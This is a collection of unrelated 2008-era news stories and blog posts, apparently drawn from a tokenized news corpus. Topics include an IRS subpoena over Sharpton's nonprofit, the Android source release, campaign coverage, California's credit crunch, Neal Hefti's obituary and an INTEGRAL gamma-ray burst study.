Anheuser - Busch , the brewer of Budweiser and Michelob , confirmed yesterday that it received a federal subpoena in connection to its charitable giving to Sharpton ’s National Action Network .
“ We have received a subpoena and are cooperating with the IRS , ” the company said in a statement .
Sharpton blasted the subpoena as a “ fishing expedition ” and said his donors are proud of their financial support .
The St. Louis - based corporation donated between $ 100,000 and $ 499,000 to NAN in 2007 alone , according to its Web site , but declined further comment about its relationship with Sharpton .
A knowledgeable source said several other corporate donors received or would soon receive subpoenas .
Sharpton himself , his business entities and his nonprofit civil - advocacy group owe millions in back taxes , documents show .
The IRS and the US Attorney ’s Office in Brooklyn have an ongoing probe into Sharpton ’s finances going back to his 2004 run for president and stewardship of NAN .
Last year , state Attorney General Andrew Cuomo began a probe of NAN because it failed to follow state financial - disclosure regulations for nonprofits .
Cuomo ’s office has since turned over its NAN file to the US Attorney ’s Office .
As of 2006 , the most recent year that financial documents for the group are publicly available , it owed $ 1.9 million in payroll taxes and penalties .
Ten NAN staffers were slapped with subpoenas this past December , and the Anheuser - Busch subpoena is part of the same probe .
News of the fresh subpoenas comes just days after The Post chronicled Sharpton ’s relationship with some of the country ’s largest corporations .
Sharpton threatened boycotts or protests against corporations while simultaneously soliciting donations and sponsorships of NAN events , The Post detailed .
Personally , Sharpton owes $ 931,397 in federal taxes and $ 365,558 in New York City taxes , according to an IRS lien .
The controversial reverend characterized the latest move by the feds as harassment .
“ I think that this is a clear , transparent political investigation , because if they started an investigation in December , why would they be subpoenaing people after December unless they are on a fishing expedition ? ”
Sharpton said .
“ Most of my annual donors had already spoken to the IRS when we did audits .
We do audits every year . ”
The IRS and US Attorney ’s Office declined to comment .

NEWSWEEK’S JONATHAN ALTER : “ [ Y ] ou remember the Keating Five scandal that he was a part of , which , by the way , it ’s crazy but there ’s been very little about it in the press in the last few weeks .
And McCain thinks he ’s getting a hard time , he ’s really getting a free ride on the fact that he was in the middle of the last great financial scandal in our country .
But his reaction to that , you would have thought , would have been more regulation of the financial services industry .
Instead he moved forward on campaign finance reform after being caught in that scandal , but did nothing – nothing – to try to prevent another savings and loan crisis from happening down the road .
He was missing in action when it came to even learning the basic lessons of a scandal that he said taught him all kinds of things that he would never forget . ”

We all know that we ought to be spending more quality time with our families , but sometimes the cost of fun activities can be prohibitively high , especially if you have a large family .
Going to the local swimming pool , going to the zoo or taking a trip to a theme park is a great way to spend a happy day together but it could also cost a small fortune .
If you ’re on a tight budget , the prospect of a long summer vacation or of endless weekends with the kids moaning that they ’re bored can be a depressing one .
Luckily , there are lots of things that you can do as a family group without spending a lot of money .
Here are just five of the things you can try this year .
1.Get Outdoors
Whatever the time of year , there ’s plenty to see and do in nature .
Heading to a beach , a wood or even a park is a wonderful way to get closer to nature , and not only will you have quality time together , you will also have a great educational opportunity for the kids .
In the Fall , you can go out and collect leaves , pine cones and acorns to make some seasonal art when you get home .
In the winter , you can head outdoors to play in the snow or to build a snowman .
In the springtime , you can make your own I Spy book and go out looking for signs of the new season .
In the summer , there ’s a world of opportunities outdoors , from playing ball games in the park to taking a hike along a local trail .
Do n’t forget your comfortable shoes !
You can find more details about how to choose the best ones for you here .
2. Find A Free Museum
There are lots of free museums all over the country , you just need to seek them out .
Not only do they represent a fun way to spend the day together without spending a cent , they ’re also another way to help teach your children about new things .
Whether you ’re visiting an art gallery or a museum about local history , you ’ll find plenty to entertain you and you ’ll have a lot to talk about afterwards .
Some free museums even offer craft activities or programs of events for families so you can get even more out of your visit without having to pay a cent .
3.Go To The Library
Another free activity that you may never have thought of before is heading off to your local library .
Many libraries have programs running during the school vacations with storytelling , craft activities or workshops that you can take part in for free or for a very low cost .
Even if there ’s nothing special happening , it ’s still a lot of fun to take a look at all the different books and to choose something to read at home .
4.Go See A Cheap Movie
Lots of cinemas now offer low cost screenings for families at the weekend or during the school vacations .
Although these movies do cost money , the fee is quite nominal and you can take in your own candy and drinks to save even more .
Some cinema chains even offer family movies for free at off - peak times such as weekday mornings – as long as you ’re prepared to get up early !
5.Have A Camp Out At Home
If you ca n’t afford to take a summer vacation there ’s no need to feel like you ca n’t have a camping experience in your very own home .
Pitch a tent in your back yard , light up the barbecue and toast some marshmallows .
You can sleep outdoors under the stars and it ’ll be just like the real thing except you ’ll be able to pop indoors to use the bathroom !
These are just five of the free or low cost activities that you can try if you ’re on a tight budget this year .
You ’ll still be able to spend quality time together as a family , and actually you may well find that you have more fun and become closer as a group without spending so much money on expensive activities .
After all , how close can your family get at a theme park ?
Over the past year , we announced Android , released several SDKs ( eventually resulting in the 1.0 SDK ) , gave out the first half of the $ 10,000,000 prize money for the Android Developer Challenge , and prepared the first Android - powered device for users .
Tomorrow , the T - Mobile G1 goes on sale .
But today , we 're making what might just be the most exciting announcement of all : we and our Open Handset Alliance partners have now released the source code for Android .
There 's a huge amount of code and content there , so head over to http://source.android.com/ for all the details .
I 'd like to offer a huge thank you and congratulations to my colleagues and the Alliance partners for what I hope will be a red- letter day for the open source community , and openness in the mobile industry .
The real story , of course , is not nearly so shocking as the headlines make out .
The source of the supposed scandal was a low - key seminar for academic researchers at Exeter University .
The seminar discussed ' pleasure and desire in educational contexts ' and the issue of ' creating primary classrooms where queer sexualities are affirmed and celebrated . '
" Gay sex lessons for 5 - year - olds " " Schools turning into gay saunas " " children to be forced to celebrate homosexuality " .
It was the perfect story for the right - wing , homophobic tabloid newspapers in the UK , with all the right ingredients for a scandal : homosexuality , innocent children , sex , wasted taxpayer money , cold - hearted boffin academics and a prime example of ' political correctness gone mad ' .
After all , why bother with the boring truth when there 's a chance to whip up a homophobic media frenzy ?
Editors ' Note : Guest blogger Milly Shaw is a freelance writer and Editor of ' the web 's tastiest lesbian magazine ' Lesbilicious.co.uk .
When she 's not writing about queer issues she 's up to her elbows in feminism , which is why she 's also a contributor to the Fword.org.uk , the home of contemporary UK feminism .
What really sparked the tabloids ' rage , however , was this statement , taken from the seminar papers :
' The team is concerned to interrogate the desexualisation of children 's bodies , the negation of pleasure and desire in educational contexts , and the tendency to shy away from discussion of ( sexual ) bodily activity in No Outsiders project work . '
No Outsiders is a Government - funded organisation set up to stop homophobic bullying and prejudice in primary schools , which usually cater for children aged 7 - 11 .
And , needless to say , it has no plans to teach children the pleasures of gay sex , as the tabloids insisted .
Speaking to online lesbian magazine Lesbilicious , Dr Elizabeth Atkinson of No Outsiders said : " The academic analysis which was the focus of the Exeter seminar is quite separate from the classroom practice of the primary teachers in the No Outsiders project .
" This project has nothing whatsoever to do with sex education - it is about preventing and challenging homophobic bullying .
It is about recognition , respect and human rights , and the resources we are using have no more to do with sex than Cinderella does . "
Naturally that has n't stopped the Christian right and other opponents of LGBT rights from jumping gleefully on the story .
" The proposal is that primary school classrooms should be turned into gay saunas , " said Patricia Morgan , author of anti-same - sex parenting book ' Children as Trophies ' to newspaper the Daily Mail .
" This is about homosexual practice in junior schools .
The idiots who repealed Section 28 should consider that this is where it has got them . "
Simon Calvert of the Christian Institute added : " When an adult who is working in a primary school suggests that children should explore their sexuality , that should result in a complaint to the police . "
And there we have the key to why the public outrage should be with the right - wing media , not in the story itself .
The Daily Mail newspaper managed to quietly slip from homosexuality to paedophilia , as if the two were somehow connected .
Needless to say , being gay has nothing at all to do with child sex abuse , but many of the 100 + online commentators make the same connection as the newspaper :
" Once adults are encouraged to think about children sexually it justifies all sorts of behaviour .
If teachers did this sort of thing they'd be out of a job and locked up ! "
" I would not want my 5 year old exploring his sexuality in the classroom with the ' help ' of an adult . "
" The level of ' sex education ' for children in this country , these days , is tantamount to child abuse .
When will someone call a halt ? "
In a country where a doctor was forced out of her home by vigilantes too stupid to know the difference between a paediatrician and a paedophile , it 's shockingly irresponsible for newspapers to mislead their readers so badly .
Gay people face enough discrimination as it is .
We are attacked in the street , harassed at work and bullied at school .
We need better education in schools to tackle homophobia from the start - in fact , we need organisations like No Outsiders .
If only the media would allow them to do their jobs , instead of trying to turn public opinion against them .
But , of course , that would n't make for such alarming headlines .
Hey !
Do you feel like going into an extreme fit of rage ?
Well you 're in luck , because we 've got a clip of Elisabeth Hasselbeck introducing Sarah Palin at a rally in Iowa earlier today .
Hasselbeck begins by exclaiming how happy she is to talk " for a full five minutes without getting interrupted ! "
She then goes on to tell the crowd she loves them , and then thanks Palin for giving " a speech about issues important to all women , " which included equal pay , ending honor killings , and , oh yeah , " ending policies that sanction abortion of the country 's unborn daughters . "
My head just exploded , so I can't type anymore , but if you 're looking for the scariest clip you 'll see during this Halloween week , it 's after the jump .
“ I wondered if they would say , ‘ Maybe this is n’t the time ; I do n’t want to spend the money if the salary is not going to be there , ’ ” she said .
“ But instead they ’re even more interested in finding exactly what they need to get into a top business school .
Everyone ’s worried about their prospects , but it ’s translated into , ‘ How do we get better credentials ? ’ ”

She added , “ Now they feel , if they want to go to business school , they need to be from one of the top ones . ”
Even at Harvard , students were more attentive at sessions and résumé round tables , said Robin Mount , interim director of career services .
In previous years , they often spent these sessions sending text messages ; this year , the sessions have been purposeful and heavily attended .
Ms. Mount said she could have heard a pin drop .
Beverly Principal , assistant director of employment services at Stanford , said she had already seen a reduction in campus recruitment by banks , though a spokeswoman at J. P. Morgan Chase said it would continue recruiting at target universities throughout the semester .
When students do receive offers , they come under more scrutiny , before and after hiring , said Ronald Storch , a partner at Marcum and Kliegman , a large accounting firm .
“ A couple years ago there was too much work and not enough bodies , ” Mr. Storch said .
“ We were hiring just to get bodies , and people could bounce from firm to firm .
Now they ’re not getting the same opportunities . ”
Jian Yang , 25 , who is in his second year at the University of Chicago ’s graduate business school , recently considered his prospects in this new climate .
Mr. Yang said he had friends who had lost jobs or taken internships at Lehman and Bear Stearns expecting to land full - time jobs , only to watch the companies fail .
He expects to graduate with $ 200,000 in student debt .
“ It ’s definitely impacting the mood of the student body , ” Mr. Yang said .
“ We ’re all watching the news every day . ”
Where students in past years set their course on a single field , like investment banking , now they are looking in several areas to improve their chances , he said .
Floating fortress : Chelsea owner Abramovich builds £ 200 m super - yacht half the size of the Bismarck
When you have a personal fortune of £ 11.7 billion , you can perhaps be forgiven for feeling the need for protection .
In Roman Abramovich 's case , the solution is to order an armour - plated mega - yacht with missile detection system to offer early warning of attack by pirates or terrorists .
At 550 ft long , the vessel , costing more than £ 200 million , will be the largest private yacht ever constructed .
A £ 200 m floating fortress :
An artist 's impression of the new yacht displays its impressive size and defence capabilities
It is being built secretly at the shipyard in Germany which produced the World War II battleship the Bismarck .
The yacht will include radar equipment designed to warn the crew of incoming rockets , together with bullet - proof windows and armour plating on the bridge and around the 41 - year - old Russian tycoon 's cabin .
There will be twin helicopter pads and anti-bugging equipment , while the crew of 70 will include former SAS and Special Boat Service personnel .
If intruders make it on board the Eclipse , named because it is intended to overshadow all other private boats , Abramovich and his girlfriend Daria Zhukova , 26 , could escape in a yellow submarine which can dive to 160ft .
Roman Abramovich and Daria Zhukova :
The tycoon is not taking any chances against pirates and other potential attackers at sea
The tycoon 's other yachts - the 377ft Pelorus , 282ft Ecstasea and 160ft Sussurro - are not believed to have missile defence systems or submarines .
And with a growing number of pirates operating in the world 's oceans , the Chelsea Football Club owner does not want to take any chances .
Should he decide to sail to the 2010 World Cup in South Africa , he will be prepared for an attack by gangs such as the Somali pirates who seized a Ukrainian cargo ship loaded with Russian tanks before demanding a large ransom less than a fortnight ago .
According to the International Maritime Bureau , pirates attacked 269 vessels last year , took nearly 300 hostages and killed five people .
Even the Mediterranean , where Abramovich usually keeps his yachts , is becoming less safe .
The 377ft Pelorus will soon be playing second fiddle to Abramovich 's newest ship - the 550ft Eclipse
In August , a gang boarded a £ 20 million yacht off Corsica and robbed guests and crew of £ 100,000 .
Under maritime law , non-naval ships are banned from carrying firearms .
Some yacht owners are adopting high - powered water cannon , earsplitting klaxons and lubricant foam intended to make boarders slip .
Diane Byrne , editor of Power and Motoryacht News , said pirates and terrorists were an increasing worry for private yacht owners .
' Piracy is n't a problem limited to Somalia , ' she said .
' It can and unfortunately does happen around the world . '
Abramovich 's yacht will also have cabins for 24 guests as well as a cinema , aquarium , disco and hospital .

Obama and McCain left the Nashville debate with the presidential campaign unavoidably shifted to the topic of economic crisis .
Campaign shifts back to economic crisis
NASHVILLE , Tenn . — Sens. John McCain and Barack Obama left here with the presidential campaign unavoidably shifted to the topic of economic crisis and onto the electoral terrain of traditionally conservative states .
McCain ’s decision to use Tuesday ’s debate to roll out a dramatic new housing plan – and to downplay an extended weekend of personal attacks on Obama – appeared to mark a recognition that , after two consecutive days of the Dow plummeting and financial hemorrhaging abroad , the market meltdown is not likely to move from the center of the campaign .

After days of attempts to persuade voters that Obama ’s ties to ‘ 60s radical Bill Ayers are a crucial character issue , McCain did n’t mention Ayers ’ name during the 90 minutes of Tuesday ’s forum .
His top aides suggested afterward that , going forward , the candidate would n’t focus on the former domestic terrorist nor invoke the name of Obama ’s controversial pastor , the Rev. Jeremiah Wright .
Nicolle Wallace , a top McCain adviser , hinted McCain would not bring it up .
“ If asked about it , of course [ he ’ll talk about Ayers ] , ” she said .
McCain ’s chief strategist , Steve Schmidt all but said the controversial pastor remained off - limits .
“ What Sen . McCain has said is that it ’s not an issue he intends to talk about in the race , ” said the aide , though he did note that Obama himself had called Wright ' fair game . '
But Schmidt did say without prompting : “ You ’ve not seen Sen. McCain advertise on [ Wright ] . "
When asked , he would n’t promise to not air ads on the pastor , but reiterated that “ Sen. McCain ’s position is clear . ”
It ’s no mystery why McCain is easing back on , or withholding entirely , such character - based assaults :
Even with the $ 700 billion rescue plan signed into law , the economic crisis appears to be worsening not stabilizing .
“ As long as the Dow is down 500 points a day , that 's going to push a lot of the Rezko and Ayers stuff off the front pages , ” acknowledged a Republican National Committee official .
Instead , McCain used the debate to unexpectedly propose , what amounts to a homeowner buyout , laying out a plan for the federal government to purchase mortgages and help Americans renegotiate their financing at a fixed rate .
McCain ’s plan reflects the continued demand that both candidates do more to address the economic crisis .
It also offers McCain , who has been criticized for having little in the way of an economic plan , a substantive idea to hold up in the remaining days of the race on an issue that has done considerable damage to his campaign .
Obama ’s aides welcomed the turn , and argued that the contest is now squarely on what they consider their turf .
Obama advisor Robert Gibbs said the campaign would continue to attack McCain ’s plan on health care , and might use a section of an exchange on health insurance from Tuesday ’s debate to do it .
A campaign centered on the economy plays to a traditional Democratic strength , and Obama campaign manager David Plouffe said he even looked forward to a sometimes - troublesome aspect of that argument for Democrats .
“ We are winning the tax discussion in the battleground states , ” he said .
“ We relish the opportunity to talk about taxes . ”
Both candidates will spend the coming days on the electoral offense , visiting states that the other party won in 2004 .
McCain and Sarah Palin will be in Pennsylvania and Wisconsin , while Obama heads to Ohio and Indiana .
McCain will also visit Minnesota , where a Republican official bragged that Obama had recently been forced to buy television ads .
But the GOP ticket will also return to red states , as well , where they ’re being forced to scramble to buy TV time and schedule rallies .
McCain and Palin will make a stop in Ohio this week and return to Virginia for the first time in a month next Monday .
Operatives on both sides , meanwhile , said they expect Obama to continue to outspend McCain , if not as heavily as he has in the past week .
“ The Obama campaign has a ton of money , and that allows them to outspend us , ” said McCain political director Mike DuHaime , who said McCain did n’t need to “ match them dollar for dollar , ” just to “ get our message out there . ”
Obama aides said they are particularly pleased to have forced McCain to compete in the expensive state of Florida , where McCain has spent little money and trails in some recent polls .
Now McCain may be forced to devote a substantial share of his limited resources there .
In the same vein , the RNC 's independent arm announced Tuesday that it would expand its multi-million ad campaign to Florida and North Carolina , two red states Palin has visited in recent days in an effort to keep them in GOP hands .
“ We need to move the race five or six points in 28 days , ” said McCain advisor Charlie Black .
Tennessee Gov. Phil Bredesen , a Democrat , said his party needed only to avoid mistakes and that steadiness would soon spell victory for Obama .
“ He just needs to continue to keep a steady hand on the rudder , ” Bredesen said .
Once again showing that this crisis is well beyond just Wall Street .
Business , individuals and even states are not receiving loans because the credit system has dried up .
Even here in France , which has a radically different banking system and is less impacted by Libor rates , many businesses are unable to get loans these days .
We are going to have to make some big changes to the system in the very near future and letting bank executives cash in on bogus paper being bought and sold has to be scrapped .
Congress still needs to revisit the Wall Street execs who walked away with hundreds of millions and hold them accountable for this widespread disaster .
California Gov. Arnold Schwarzenegger , alarmed by the ongoing national financial crisis , warned Treasury Secretary Henry M. Paulson on Thursday that the state might need an emergency loan of as much as $ 7 billion from the federal government within weeks .
The warning comes as California is close to running out of cash to fund day - to - day government operations and is unable to access routine short - term loans that it typically relies on to remain solvent .
The state of California is the biggest of several governments nationwide that are being locked out of the bond market by the global credit crunch .
If the state is unable to access the cash , administration officials say , payments to schools and other government entities could quickly be suspended and state employees could be laid off .
Plans by several state and local governments to borrow in recent days have been upended by the credit freeze .
New Mexico was forced to put off a $ 500 - million bond sale , Massachusetts had to pull the plug halfway into a $ 400 - million offering , and Maine is considering canceling road projects that were to be funded with bonds .
California finance experts say they know of no time in recent history when the state has sought an emergency loan of this magnitude from the federal government .
The only other such rescue was in 1975 , they said , when the federal government lent New York City money to avoid bankruptcy .
Japanese telecommunications giant , NTT , have developed a pair of prototype shoes that generate electricity when you walk .
The shoes produce 1.2 watts , which is enough energy to power your iPod forever – as long as you do n’t stop walking .
The shoes are fitted with water - filled soles that when squished with each step , forces the water past a small turbine submerged / embedded inside .
The turbine is attached to a small generator which produces electricity .
Apparently the company is trying to increase the power generation to 3 watts , which would be enough to charge a mobile phone .
If you needed to make a call but have a low battery , you could maintain a connection with a bit of “ walk and talk . ”
The shoes do not have batteries to store energy , but that could be a possible addition if the technology proves popular .
NTT is looking to have their generator in real products by 2010 .
The water - filled soles sound like they ’d be really comfy … aside from the turbine sticking into your foot .
Wait .
Maybe the turbine would be in the arch .
They could n’t leave it jutting out the front like that !
Also , no word on any clever power - transfer tech … who really wants a cord snaking up their leg ?

Alright , this has gone on long enough , and frankly I ’m fed up .
I ’ve been in New York for over a year in a venerable cheesesteak drought .
I aim to do something about it and I want you to help me .
We ’ll say it ’s a mission of discovery to find the best , and “ best ” might be a dubious honor , cheese and meats combo in town .
Let ’s call it a Cheesesteak Crawl .
And you ’re all invited .
The plan is to get enough of us together so that we can have a few people share a cheesesteak ( rather than each of us eating seven cheesesteaks in one day ) .
We ’ll be on foot , and probably hit a bar or two along the way for some added refreshment / naps .
Here ’s the final kicker : I ’m going to design some scorecards for everyone to rate the places we visit based on a few factors like cheese , meat , roll , taste , preparation , greasiness , etc .
Afterwards , I ’ll tally the results , post them here , and we ’ll crown a winner .
The whole day might amount to “ NYC is a cheesesteak wasteland ” , but hell , I need to know for sure .
And it will be a good chance to meet some new people .
I made a handy little map of the joints we ’ll hit and the order of the crawl .
The list includes all of the big places that make so - called “ Philly Cheesesteaks ” : BB Sandwich Bar , Wogie ’s Bar & Grill , Cheesesteak Factory , 99 Miles to Philly , Carl ’s Steaks , Tony Luke ’s , and Philly Slim’s .
We ’ll meet at the southwest corner of Washington Square Park at noon on Saturday , September 27th ( rain date , Sunday , September 28 ) .
RSVP on the event page if you ’re in .
Once it gets a bit closer to the date , I ’ll post the scorecard on my site for download ( and I ’ll bring a bunch on the day of along with some of those little mini - golf pencils ) .
Who ’s with me ?
If you ’ve never had a cheesesteak , this will be a good time to try one .
Think of it as a slow moving , and likely very winded , foodie flash mob .
So , if you are in or around NY , come along !
It shall be a glorious gastronomical adventure !
UPDATE : The results are in !
If you were ever so declined , as I was , to open up and read the 2008 Republican Party Platform , you might have noticed something , printed lovingly , on page two of the pdf document .

Katharine Lee Bates
My first thought , though I probably should n’t say this , was , “ Was n’t she a Socialist ? ”
But then I grabbed the nearest two - by - four and smacked myself over the head , because I was getting her confused with Francis Bellamy , the author of The Pledge of Allegiance , who , it turns out , is a guy !
( I did say I should n’t say this , did n’t I ?
Serves me right . )
Anyway , the man who wrote the Pledge of Allegiance did not believe in the same things today ’s Republican Party believed in , but they still feel they should recite his words at every political event .
Not that I ’m trying to say they like to turn patriotism into a political issue or anything .
Ironic indeed .
Hey , did someone say “ ironic ” ?
Just wait , there ’s more !
By now I was feeling ever so inclined to look up this Katharine Lee Bates woman .
Who was the woman whose words so inspired the authors of the report ( THE COMMITTEE ON ARRANGEMENTS FOR THE 2008 REPUBLICAN NATIONAL CONVENTION .
Yes , they were very loud about it ) that they would quote her on their dedication page ?
No , it could n’t be her .
( It was n’t .
Whew ! )
Well , here ’s what the Women ’s History section ( of About.com ) had to say about her :
Katharine Lee Bates ( August 12 , 1859 – March 28 , 1929 ) Probably best known as the author of the words to “ America the Beautiful , ” Katharine Lee Bates was a prolific poet and a professor of English and head of the English department at Wellesley , where she had been a student in its earliest years .
Her father , a Congregational minister , died when Katharine was less than a month old .
Her brothers had to go to work to help support the family , but Katharine was given an education .
She received her B.A. from Wellesley College in 1880 .
She wrote to supplement her income .
“ Sleep ” was published by The Atlantic Monthly during her undergraduate years at Wellesley .
A trip to Colorado in 1893 and the view from Pikes Peak inspired Katharine Lee Bates to write the poem , “ America the Beautiful , ” which was published in The Congregationalist two years after she wrote it .
The Boston Evening Transcript published a revised version in 1904 , and the public adopted the idealistic poem quickly .
Katharine Lee Bates helped found the New England Poetry Club in 1915 and served for a time as its president , and she was involved in a few social reform activities , working for labor reform and planning the College Settlements Association with Vida Scudder .
She was raised in the Congregational faith of her ancestors ; as an adult , she was deeply religious but could not find a church in whose faith she could be certain .
Katharine Lee Bates lived for twenty - five years with Katharine Coman in a committed partnership that has sometimes been described as a “ romantic friendship . ”
Bates wrote , after Coman died , “ So much of me died with Katharine Coman that I ’m sometimes not quite sure whether I ’m alive or not . ”
Bates ’ teaching career was the central interest of her adult life .
She believed that through literature , human values could be revealed and developed .
How many of the following things do the Republicans not know about the author from whose worked they borrowed ?
She was an English Professor ( those damn liberal teachers ) ;
She attended and taught at Wellesley College ( the very same one Sen Hillary Clinton went to ) ;
She was inspired to write the poem after a visit to the same state where the Democrats just held their convention ( which shows the Democrats have good taste ) ;
She was a social reformer ( sometimes known as a “ community activist ” if you will ) ;
She helped work for labor reform ( but not in the way the Republicans would like ) ;
She had a hard time finding a church in whose faith she could be certain ( unlike Republicans , who are certain of their religious beliefs ) ;
AND , to top it all off , she was very likely a lesbian !
( Just in case they missed the family values angle . )
And this is the person whose words they wanted to use on their dedication page ?
She was everything the Republicans despise in a woman .
I can only hope the rest of the document is this ironic .

Neal Hefti , a former big band trumpeter , arranger and composer who worked with Count Basie and Woody Herman and later composed the memorable themes for the movie “ The Odd Couple ” and the campy hit TV series “ Batman , ” has died .
He was 85 .
Hefti died Saturday at his home in Toluca Lake , said his son , Paul .
He did not know the cause of death , but said his father had been in good health .
“ Everybody in the music business loved Neal Hefti , ” radio and television personality Gary Owens , a longtime friend , told The Times on Tuesday .
“ He was one of the really great arrangers and composers of all time , ” Owens said .
“ He worked with all those guys -- Charlie Spivak , Harry James , Woody Herman -- and he made arrangements that were just spectacular . ”
Advertisement
Described as “ one of the most influential big band arrangers of the 1940s and ‘ 50s ” in “ The Encyclopedia of Popular Music , ” Hefti turned his attention to composing for film and television in the 1960s .
Among his credits as a film composer are “ Sex and the Single Girl , ” “ Harlow ” ( one of his most famous tunes , “ Girl Talk , ” came out of the score ) , “ How to Murder Your Wife , ” “ Boeing Boeing , ” “ Duel at Diablo , ” “ Barefoot in the Park , ” “ A New Leaf , ” “ Last of the Red Hot Lovers ” and “ The Odd Couple , ” whose theme he reprised for the 1970s TV series .
Hefti also gained wide notice for composing the energetic title theme for “ Batman , ” the over - the - top 1966 - 68 superhero series that became an overnight sensation .
It was , Hefti later said , the hardest piece of music he ever wrote .
Advertisement
“ I tore up a lot of paper , ” he told Jon Burlingame , author of “ TV’s Biggest Hits , ” a 1996 book on television themes .
“ It did not come easy to me .
. . .
I just sweated over that thing , more so than any other single piece of music I ever wrote .
I was never satisfied with it . ”
“ Batman , ” he said , “ was not a comedy .
This was about unreal people .
Batman and Robin were both very , very serious .
The bad guys would be chasing them , and they would come to a stop at a red light , you know .
They would n’t break the law even to save their own lives .
So there was a grimness and a self - righteousness about all this . ”
Hefti said it took him “ the better part of a month ” to come up with the theme .
“ I was almost going to call them and say , I ca n’t do it , ” he said .
“ But I never walk out on projects , so I sort of forced myself to finish . ”
Advertisement
Hefti’s “ musical solution to a combined dramatic and comedic problem , ” Burlingame wrote in his book , “ was perfect : bass guitar , low brass and percussion to create a driving rhythm , while an eight - voice chorus sings ‘ Batman ! ’ in harmony with the trumpets .
It was part serious , part silly : just like the series . ”
Hefti’s “ Batman ” tune became a Top 40 hit -- for both the Hefti and the Marketts ’ versions -- and won a 1966 Grammy Award for best instrumental theme .
The son of a traveling salesman , Hefti was born Oct. 29 , 1922 , in Hastings , Neb .
He began playing the trumpet at age 11 .
His family was poor , and in high school he started playing in local bands during summer vacation to help his family financially .
Advertisement
Hefti began writing arrangements in high school for local bands , and some of his arrangements also were used by the Earl Hines band .
In 1941 , two days before his high school graduation , Hefti was asked to tour with the Dick Barry band , which had lost some of its musicians to the military .
The short - lived job ended in New Jersey .
But other band jobs followed , including playing with the Bob Astor , Charlie Barnet , Bobby Byrne , Horace Heidt and Charlie Spivak bands .
Hefti , who was classified 4 - F during World War II after being hit by a car in New York and breaking his pelvis , joined Woody Herman ’s band in 1944 .
Advertisement
He did the arrangements for many of the Herman band ’s popular recordings , including composing and arranging “ The Good Earth ” and “ Wild Root . ”
He also co-arranged , with Ralph Burns , “ Caldonia . ”
In 1945 , Hefti married the Herman band ’s lead female vocalist , Frances Wayne .
They remained married until her death in 1978 .
Hefti formed his own band in 1951 , with his wife as lead vocalist .
But after two years of touring , he returned to arranging and studio work .
As a composer and arranger for Basie in the 1950s , Hefti composed numerous tunes that were featured on various Basie albums .
Advertisement
That included the Grammy Award - winning album “ Basie , ” which Hefti produced .
Known as “ Atomic Basie ” because of the atomic explosion pictured on the cover , the album featured 11 songs composed and arranged by Hefti , including “ Splanky , ” “ Kid From Red Bank ” and “ Lil ’ Darlin , ” which Hefti wrote for his daughter .
“ If it were n’t for Neal Hefti , ” legendary trumpeter Miles Davis said in a 1955 interview , “ the Basie band would n’t sound as good as it does . ”
As head of A&R ; ( Artists and Repertoire ) at Reprise in the early ‘ 60s , Hefti arranged and conducted “ Sinatra and Basie : A Historical Musical First ” and “ Sinatra and Swingin ’ Brass . ”
Hefti retired in 1976 .

In addition to his son Paul , a music composer , Hefti is survived by a brother , Joe ; a sister , Pat Wacha ; and three grandchildren .
Services will be private .
Instead of flowers , Paul Hefti suggests that donations be made to Boys Town , P.O. Box 145 - Memorial , Boys Town , NE 68010 , or to the American Cancer Society , P.O. Box 22718 , Oklahoma City , OK 73123 .
Both Hefti’s wife and daughter , Dr. Marguerita Hefti , died of cancer .

INTEGRAL confirms distinct , low - luminosity population of gamma-ray bursts
13 October 2008
This result is reported by Suzanne Foley and colleagues in the June 2008 issue of Astronomy & Astrophysics .
Gamma ray bursts ( GRBs ) are sudden , short ( durations from milliseconds to several hundred seconds ) , non-repeating explosions of high - energy ( from a few ten to several hundred keV ) photons .
They were first observed in the late 1960's by the satellites monitoring the nuclear test - ban treaty .
Until the launch of the Compton Gamma Ray Observatory ( 1991 ) the observation of GRBs remained a sporadic and serendipitous event .
The BATSE instrument aboard CGRO was purpose - built to monitor the whole sky for this type of event , and by the end of its 9 years of operations it had detected more than 2700 GRBs , allowing the systematic study of their characteristics to be carried out .
Global network localises and identifies GRB counterparts
The most striking piece of evidence to be derived from this first systematic catalogue of GRBs was the complete isotropy of the distribution of GRBs in the sky , suggesting a cosmological origin .
Identification of possible counterparts remained however elusive , because of the large error boxes associated with the positions of the bursts .
By the mid-1990 's a number of models had predicted that a GRB would be followed by enhanced emission at X - ray energies ( the afterglow ) .
Then in 1997 , the BeppoSAX satellite managed to detect the first X - ray afterglow of a GRB , at the same time localizing the source of the emission to about one arcminute .
This allowed follow - up observations at other wavelengths to be executed .
Since then the rapid location of GRB coordinates and their automatic distribution to observatories around the world has resulted in the identification of several GRB counterparts and their study at multiple wavelengths .
The most sensitive gamma-ray burst detector in space
The INTEGRAL gamma-ray observatory was designed to perform fine spectroscopy and imaging of celestial gamma-ray sources in the energy range 15 keV to 10 MeV .
Although not optimized for the detection of GRBs INTEGRAL ’s IBIS imaging telescope has turned out to be the most sensitive gamma -ray burst detector launched to date .
This is primarily because of its very small field - of - view ( when compared to the all - sky monitors more commonly used ) which is very well shielded from background radiation .
The combination of IBIS and the SPI spectrometer yield a valuable data set for GRBs that happen to explode in the INTEGRAL field of view .
A new population of local , low - luminosity GRBs
Foley and colleagues now demonstrate that INTEGRAL's high sensitivity has allowed it to detect a hitherto unnoticed population of GRBs .
The team of Irish scientists analyzed the time profiles of the 47 GRBs detected by INTEGRAL in the period October 2002 to July 2007 .
This , together with spectral analysis , is a standard method used to categorize GRBs .
In most GRBs , the higher energy emission precedes ( in time ) the low energy emission : this is referred to as the spectral lag .
The INTEGRAL data show that events with a long ( > 0.75s ) lag are also systematically weaker , suggesting that they belong to a different population .
This conclusion is strengthened when the positions of the long - lag events are plotted in supergalactic coordinates .
( The supergalactic plane is a planar structure in the local galaxy density field , mapping the distribution of galaxies in the local universe . )
The events detected by Foley and colleagues appear to be aligned with the supergalactic plane , and are therefore inferred to be local and not at cosmological distances , in contrast to the distribution of high luminosity GRBs .
Within the BATSE GRB catalogue there was already some hint of a population of low - luminosity gamma-ray bursts with a tendency to concentrate near the supergalactic plane ( Norris 2002 ) .
However , these appeared only at the faintest limits of the catalogue and it is only with the increased detection capability of INTEGRAL that these bursts can be clearly identified .
This result is important because it reveals another facet of the GRB phenomenology : a new population of bursts associated with sources in the local universe , a population to which the INTEGRAL telescope is particularly sensitive .

Phil Katz 1962 - 2000
Some folks have asked me what I know about Phil Katz .
It occurs to me that most folks have probably never heard the story , and of the ones who have heard of it , few would know or remember the details .
So here 's what I know about Phil Katz , plus a little history to put it in context .
The dates could be off a bit .
I also have a copy of Ben Baker 's take on the whole deal , which goes into a lot more detail .
